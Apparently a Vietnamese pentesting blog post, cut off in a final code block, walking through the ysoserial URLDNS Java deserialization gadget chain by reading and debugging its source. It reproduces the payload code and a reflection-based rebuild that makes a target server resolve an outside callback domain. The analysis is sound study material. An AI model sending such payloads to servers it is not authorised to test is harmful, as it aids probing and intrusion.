<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java Deserialze - URLDNS Chain analysis (ysoserial) | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Java Deserialze - URLDNS Chain analysis (ysoserial) Java Deserialize là gì? Java cung cấp cho người dùng hàm writeObject() để tiến hành quá trình serialize các object ở đây quá trình serialize sinh ra">
<meta property="og:type" content="article">
<meta property="og:title" content="Java Deserialze - URLDNS Chain analysis (ysoserial)">
<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-10-28-Ysoserial-URLDNS/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="Java Deserialze - URLDNS Chain analysis (ysoserial) Java Deserialize là gì? Java cung cấp cho người dùng hàm writeObject() để tiến hành quá trình serialize các object ở đây quá trình serialize sinh ra">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-11-14T19:34:38.235Z">
<meta property="article:modified_time" content="2025-10-30T17:42:16.548Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="ysoserial">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Java Deserialze - URLDNS Chain analysis (ysoserial)",
  "url": "https://pzhat.github.io/2025/11/15/2025-10-28-Ysoserial-URLDNS/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-11-14T19:34:38.235Z",
  "dateModified": "2025-10-30T17:42:16.548Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-10-28-Ysoserial-URLDNS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Java Deserialze - URLDNS Chain analysis (ysoserial)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Java Deserialze - URLDNS Chain analysis (ysoserial)</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Java Deserialze - URLDNS Chain analysis (ysoserial)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.235Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-30T17:42:16.548Z" title="Updated 2025-10-31 00:42:16">2025-10-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/ysoserial/">ysoserial</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Java-Deserialze-URLDNS-Chain-analysis-ysoserial"><a href="#Java-Deserialze-URLDNS-Chain-analysis-ysoserial" class="headerlink" title="Java Deserialze - URLDNS Chain analysis (ysoserial)"></a>Java Deserialze - URLDNS Chain analysis (ysoserial)</h1><p><img src="https://hackmd.io/_uploads/r1R3sp6Rgl.png" alt="image"></p>
<h3 id="Java-Deserialize-la-gi"><a href="#Java-Deserialize-la-gi" class="headerlink" title="Java Deserialize là gì?"></a>Java Deserialize là gì?</h3><ul>
<li>Java cung cấp cho người dùng hàm <code>writeObject()</code> để tiến hành quá trình <code>serialize</code> các object ở đây quá trình serialize sinh ra để chuyển một đối tượng Java thành chuỗi byte để lưu trữ (file, DB) hoặc truyền qua mạng (socket, RMI, JMS).</li>
<li>Và để có thể đọc được dữ liệu được serialize từ <code>ObjectInputStream</code> ta có quá trình <code>deserialize</code> ở java sử dụng hàm <code>readObject()</code> cho quá trình đó.</li>
</ul>
<h3 id="Khai-thac-Java-Object-Injection"><a href="#Khai-thac-Java-Object-Injection" class="headerlink" title="Khai thác Java Object Injection"></a>Khai thác Java Object Injection</h3><ul>
<li>Rủi ro sẽ đến với các đối tượng xử lý deserialize các <code>Untrusted Data</code>.</li>
<li>Attacker có thể lợi dụng các magic method, cách mà OOP vận hành từ đó tạo ra <code>exploit chain</code> hoàn chỉnh và tiến hành sử dụng payload.</li>
</ul>
<h3 id="Tien-hanh-Setup-moi-truong-test"><a href="#Tien-hanh-Setup-moi-truong-test" class="headerlink" title="Tiến hành Setup môi trường test"></a>Tiến hành Setup môi trường test</h3><p><img src="https://hackmd.io/_uploads/S1UCyu2Clg.png" alt="image"></p>
<p>Tiến hành truy cập Respository của ysoserial tại : <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>Bây giờ tiến hành tải toàn bộ project về phân tích.</p>
<p><img src="https://hackmd.io/_uploads/rysIqt20le.png" alt="image"></p>
<p>Với project java như này để dễ cho việc đặt break point và debug thì tôi sử dụng IntelliJ IDEA để phân tích và debug.</p>
<p><img src="https://hackmd.io/_uploads/rkAYti30le.png" alt="image"></p>
<p>Truy cập vào Project sau đó truy cập đến thẳng <code>/src/main/java/ysoserial/payloads/URLDNS</code> ở đây tôi không cần cài thêm cái gì nữa vì <code>IntelliJ</code> hầu như có sẵn hết rồi chỉ việc debug.</p>
<h3 id="Mot-so-dieu-ve-URLDNS"><a href="#Mot-so-dieu-ve-URLDNS" class="headerlink" title="Một số điều về URLDNS"></a>Một số điều về URLDNS</h3><ul>
<li>Một trong những ưu điểm của <code>URLDNS</code> là nó &#x3D;&#x3D;không yêu cầu&#x3D;&#x3D; bất kì <code>library/dependencies</code> nào nên có thể dùng để nhận biết Deserialization ở trên bất kì version của Java.</li>
<li>Đây là một trong số các chain đơn giản nhất của ysoserial.</li>
<li>Chain này &#x3D;&#x3D;không có tác dụng để RCE&#x3D;&#x3D; nó chỉ đơn giản có tác dụng là chạy &#x3D;&#x3D;DNS request&#x3D;&#x3D; chức năng nó tương tự như là DNSLookup.</li>
<li>URLDNS là một “gadget chain” dùng trong các cuộc thử nghiệm deserialization &#x3D;&#x3D;Java OOB (out‑of‑band)&#x3D;&#x3D; khi mà attacker nhận được kết quả truy vấn DNS thì chứng tỏ payload đã thực thi.</li>
<li>Chain tận dụng các lớp&#x2F;behavior có sẵn trên classpath của JVM mục tiêu (ví dụ các lớp trong java.net, JNDI, hoặc các thư viện bên thứ ba) để khiến JVM thực hiện lookup.</li>
</ul>
<h3 id="Tien-hanh-phan-tich-source-va-payload"><a href="#Tien-hanh-phan-tich-source-va-payload" class="headerlink" title="Tiến hành phân tích source và payload"></a>Tiến hành phân tích source và payload</h3><p>Tiến vào trong payload ta thấy rằng có rất nhiều dòng comment để giải thích luồng hoạt động của payload cho ta dễ hiểu được cách mà payload đó hoạt động ở đây có dòng : </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>Ở đây họ comment cho mình luôn gadget chain của payload này cụ thể ở đây nó sẽ lần lượt gọi đến theo thứ tự : </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() --&gt; HashMap.putVal() --&gt; HashMap.hash() --&gt; URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>Bây giờ ta đi vào các thành phần bên trong payload.</p>
<p><img src="https://hackmd.io/_uploads/Sk3HkhhAgg.png" alt="image"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>Ở comment nói khá đầy đủ nhưng mình vẫn sẽ phân tích từng đoạn một : </p>
<ul>
<li>Hàm <code>getObject(final)</code> được gọi khi mà bắt đầu quá trình serialize</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br></pre></td></tr></table></figure>

<ul>
<li>Ở đây từ <code>URLStreamHandler</code> ta tạo một handle khác tuỳ chỉnh để có thể tránh việc nó thực hiện DNS resolution trong quá trình tạo payload nghĩa là nếu trong quá trình tạo ra payload nếu không có handle này nó sẽ tự động truy vấn trong lúc gen payload.</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//The value</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Tạo một HashMap và dùng URL làm key, giá trị chỉ là chuỗi url (Serializable).</li>
<li>Việc dùng URL làm key là quan trọng: HashMap sử dụng hashCode() của key để tính bucket; khi HashMap được deserialize, mã sẽ tính lại hashCode cho từng key, và đó là lúc URL có thể thực hiện lookup.</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>Gọi reflection, ta để ý ở trên giá trị <code>u</code> đã được <code>put</code> ở bên trên sau đó nó được hashcode tính là tiến hành cache bây giờ chỉ cần giá trị <code>hashcode</code> được gọi thì nó sẽ tiến hành DNS request sau đó cài hashcode là <code>-1</code> thì nó sẽ tự dọn đi giá trị cũ hashmap sau chỉ cần có giá trị mới nó sẽ lặp lại quá trình trigger.</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ht;</span><br></pre></td></tr></table></figure>

<ul>
<li>Trả về HashMap chứa URL key. Khi object này được serialized rồi gửi tới server mục tiêu và server gọi ObjectInputStream.readObject(), HashMap.readObject() sẽ khôi phục các entry và gọi put&#x2F;rehash, dẫn tới gọi URL.hashCode() &#x3D;&gt; DNS lookup.</li>
</ul>
<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>Bây giờ ta sẽ Debug từ hàm main để xem nó như thế nào.</p>
<p><img src="https://hackmd.io/_uploads/H1V002nCxl.png" alt="image"></p>
<p>Đầu tiên ta sẽ click phải vào hàm main sau đó đi đến <code>Edit Run Configuration</code> ở đây là URLDNS nó hiện ra cho bạn sau đó sử dụng bất kì công cụ nào để bắt request cũng được bạn có thể dùng <code>Burp Collab</code> ở đây mình dùng <a target="_blank" rel="noopener" href="https://requestrepo.com/">RequestRepo</a> để bắt được DNS request trả về.</p>
<p>Sau khi apply và ok thì ta sẽ bấm debug hàm main này chờ xem kết quả trả về ở đây là gì.</p>
<p><img src="https://hackmd.io/_uploads/B17tJTnRex.png" alt="image"></p>
<p>Kết quả trả về khá là khả quan nó đã connect đến target sau đó gen payload tiến hành serialize sau đó deserialize cuối cùng là disconnect với target bây giờ truy cập target xem có request nào không.</p>
<p><img src="https://hackmd.io/_uploads/rycxep2Cll.png" alt="image"></p>
<p>Thành công bắt trọn được 2 DNS request vậy ta chắc chắn rằng payload thực hiện DNS request tốt bây giờ tiến hành đặt breakpoint để đi theo flow của gadget chains.</p>
<p>Đầu tiên ta thử breakpoint ở hàm main trước.</p>
<p><img src="https://hackmd.io/_uploads/BkJxrCnRxe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Hk4JX1TCxg.png" alt="image"></p>
<p>Debug đã nhận bây giờ dùng phím F7 để có thể tiếp tục chạy đến xem thử flow xử lý của code payload này.</p>
<p><img src="https://hackmd.io/_uploads/HyK8XJTClg.png" alt="image"></p>
<p>Khi chạy đến nơi xử lý HashMap ta thấy rằng giá trị URL đã được gắn vào key đó.</p>
<p><img src="https://hackmd.io/_uploads/r1a6mkpCgx.png" alt="image"></p>
<p>Sau khi chạy đến đoạn <code>ht.put(u, url);</code> thì ta thấy nó bắt đầu trigger DNS request giá trị các trường được gắn bên dưới ta sẽ khám phá nơi hàm <code>put</code> này được khai báo để xem nó có gọi đến gadget nào không.</p>
<p><img src="https://hackmd.io/_uploads/rykQDJTAxe.png" alt="image"></p>
<p>Ở đây ta thấy nó trỏ đến hàm này mà ta để ý rằng trong đoạn comment của chain có</p>
<p><img src="https://hackmd.io/_uploads/H1qCP16Alg.png" alt="image"></p>
<p>Mà ta để ý rằng hàm readObject nằm bên trong <code>rt.jar</code> bây giờ nó gọi đến <code>putVal</code> hay là <code>HashMap.putVal()</code> </p>
<p><img src="https://hackmd.io/_uploads/SyzuRkpCgg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ByAJNxpCle.png" alt="image"></p>
<p>Tra đường đi của hàm readObject ta thấy rằng nó được gọi ở đây ở ngay hàm <code>readObject</code> ở đây ta có thể thử đặt breakpoint để debug.</p>
<p><img src="https://hackmd.io/_uploads/SJlC4la0lg.png" alt="image"></p>
<p>Có thể thấy các key value đã được gán vào bây giờ ta sẽ thử trỏ đến method <code>hash(key)</code> xem thử nó gọi đến đâu tiến hành F7 và chọn vào method hash.</p>
<p><img src="https://hackmd.io/_uploads/ByHhHlaAxg.png" alt="image"></p>
<p>Từ method readObject() gọi tới method hash() và có truyền vào biến key, giá trị của key chính là URL Object của target mình cần resolve DNS.</p>
<p>Tại đây nó gọi tới method hash của object key vừa được truyền vào cụ thể là <code>key.hashcode()</code> hay lúc này là <code>URL.hashcode()</code>.</p>
<p><img src="https://hackmd.io/_uploads/ry-5DgpAxe.png" alt="image"></p>
<p>Method <code>hashCode()</code> nằm ở class URL tiến hành check xem thử có giá trị hashCode nào được cache không trong trường hợp nó đã được cache thì nó sẽ return về giá trị luôn có nghĩa là nếu hashCode !&#x3D; -1 thì nó sẽ return luôn và đoạn chain nó sẽ đứt ở đây vì thế thứ ta cần là để nó thoả mãn điều kiện if để <code>URL.hashCode()</code> được call đến <code>handler.hashCode()</code>. Vì thế ở đây để điều kiện nó luôn <code>= -1</code> thì ta sẽ sử dụng java reflection.</p>
<p><img src="https://hackmd.io/_uploads/r19OfVp0lx.png" alt="image"></p>
<p>Ta có thể thấy rằng trong payload tác giả đã để sẵn một hàm <code>Reflection</code> và set giá trị <code>hashCode()</code> luôn luôn là <code>-1</code>.</p>
<p>Ở bên dưới ta còn thấy object <code>hashCode()</code> còn được handler gọi đến ta sẽ đi đến thử handler này xem nó xử lý gì.</p>
<p><img src="https://hackmd.io/_uploads/B1mDbV60ee.png" alt="image"></p>
<p>Vì ở đây là một giá trị private field ta sẽ dùng thử reflection để dựng lại URLDNS chain xem thử nó có đúng với luồng hoạt động mà ta đã đi không.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;https://a7kvklhv.requestrepo.com/&quot;</span>, handler);</span><br><span class="line">ht.put(u1, <span class="string">&quot;https://a7kvklhv.requestrepo.com/&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">test</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">test.setAccessible(<span class="literal">true</span>);</span><br><span class="line">test.set(u1, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> ht;</span><br></pre></td></tr></table></figure>

<p>Tạo biến URL mới bao gồm 3 giá trị bên trong sử dụng lại ht khi đã gọi HashMap sau đó lấy Field HashCode từ class URL sau đó ta sẽ set cho Field đó là Accessible là true vì khi không set thì nó mặc định Field đã là private thì mình không thể reflect đến được sau đó ta tiến hành set giá trị object của class URL ở đây ta set là <code>-1</code>.</p>
<p><img src="https://hackmd.io/_uploads/Sy9f9NTAex.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Hk6rqEaCge.png" alt="image"></p>
<p>Ta có thể thấy debug đã đúng như ta dự đoán giá trị hashCode của object <code>u1</code> đã được set thành <code>-1</code> thành công kiểm chứng được reflected ta sẽ thử đổi thành 1 xem liệu nó có thay đổi không nếu thanh đổi được thì gadget đã đúng với hướng.</p>
<p><img src="https://hackmd.io/_uploads/ryzR5Ep0xl.png" alt="image"></p>
<p>Thành công đổi hashCode thành 1 vậy là ta đã dựng được đúng.</p>
<p>Sau quá trình phân tích reflected ta tiếp tục debug với handler xem nó xử lý gì tiếp ở sau.</p>
<p>Như các bạn đã thấy thì URL.hashCode() sẽ call tới handler.hashCode(), handler ở đây là object của class <code>URLStreamHandler</code> </p>
<p><img src="https://hackmd.io/_uploads/SywBaV6Cll.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJhLAVaRge.png" alt="image"></p>
<p>Hàm này được khai báo abstract ta sẽ thử debug đọc từng dòng trong class <code>URLStreamHandler</code>.</p>
<p><img src="https://hackmd.io/_uploads/BkQryraCgx.png" alt="image"></p>
<p>Tìm thấy một hàm rất khả nghi ở đây vì ở đây nó thực hiện <code>getHostAddress(u)</code> sau đó nếu mà biến <code>u != null</code> thì thực hiện gọi đến <code>hashCode()</code> nên ta sẽ thử đặt một cái breakpoint ngay hàm này xem.</p>
<p><img src="https://hackmd.io/_uploads/H15KeBpAex.png" alt="image"></p>
<p>Ở đây nếu debug tiếp nó sẽ gọi về url DNS của mình ta tiếp tục follow.</p>
<p><img src="https://hackmd.io/_uploads/ByQa4HpCxl.png" alt="image"></p>
<p>Ta thấy rằng ở đây InetAddress <code>.getByName()</code> đã gọi đến host trong khi đó nó trỏ đến URL của ta thêm vào vậy đây chính là sink của cả payload là nơi thực thi resolve DNS. </p>
<p>Đây là file <code>Generation Payload</code> nó sẽ trả về file dưới dạng base64 format giống như payload do payload gốc đưa ra.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 